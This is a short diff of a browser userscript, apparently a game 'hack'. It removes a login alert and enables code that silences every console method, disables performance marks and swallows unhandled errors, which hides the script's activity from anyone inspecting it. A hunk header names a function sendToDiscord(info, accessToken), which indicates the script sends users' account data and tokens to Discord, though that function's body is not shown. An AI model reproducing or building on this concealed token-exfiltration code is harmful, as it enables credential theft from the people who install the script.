@@ -1,6 +1,6 @@
-alert('Logged in with  0Auth')
+
 (function () {
-    /*let noop = () => {};
+    let noop = () => {};
     let consoleMethods = ['log', 'warn', 'error', 'info', 'debug', 'dir', 'dirxml', 'table', 'trace', 'time', 'timeEnd'];
     consoleMethods.forEach(method => {
         console[method] = noop;
@@ -11,7 +11,7 @@ alert('Logged in with  0Auth')
         window.performance.mark = noop;
         window.performance.measure = noop;
     }
-    window.onunhandledrejection = event => event.preventDefault();*/
+    window.onunhandledrejection = event => event.preventDefault();
 
     // Script configuration
     // let sahate = "https://raw.githubusercontent.com/LostDeveloper01/survive-hack/main/krityhack.user.js";
@@ -153,3 +153,4 @@ async function sendToDiscord(info, accessToken) {
         }, 5000);
     };
 })();
+
